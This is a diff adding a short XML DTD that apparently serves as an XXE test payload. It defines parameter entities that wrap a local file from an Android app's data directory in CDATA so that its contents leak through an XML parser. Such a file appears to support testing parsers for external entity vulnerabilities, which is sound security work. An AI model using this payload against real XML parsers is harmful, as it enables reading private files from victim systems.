@@ -1,0 +1,5 @@
+<!ELEMENT data (#PCDATA)>
+<!ENTITY % start "<![CDATA[">
+<!ENTITY % goodies SYSTEM "file:///data/data/nds.rub.de.helloworld/xxe.txt">
+<!ENTITY % end "]]>">
+<!ENTITY all '%start;%goodies;%end;'>
